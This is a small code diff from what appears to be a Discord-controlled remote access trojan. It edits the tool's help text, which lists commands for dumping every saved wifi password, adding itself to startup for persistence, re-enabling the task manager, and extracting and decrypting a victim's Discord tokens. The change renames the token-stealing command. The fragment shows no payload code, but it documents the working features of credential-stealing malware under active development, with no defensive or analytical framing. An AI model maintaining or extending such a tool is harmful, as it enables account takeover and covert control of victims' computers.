@@ -96,7 +96,7 @@ Availaible commands are :
 --> !enbtaskmgr = enable task manager(if disabled)(Admin rights are required)
 --> !getwifipass = get all the wifi passwords on the current device(Admin rights are required)
 --> !startup = add file to startup(when computer go on this file starts)(Admin rights are required)
---> !getdiscordtoken = get discord token ONLY! (also decrypts them)
+--> !getdiscordtokens = get discord token ONLY! (also decrypts them)
 """
 
 async def activity(client):
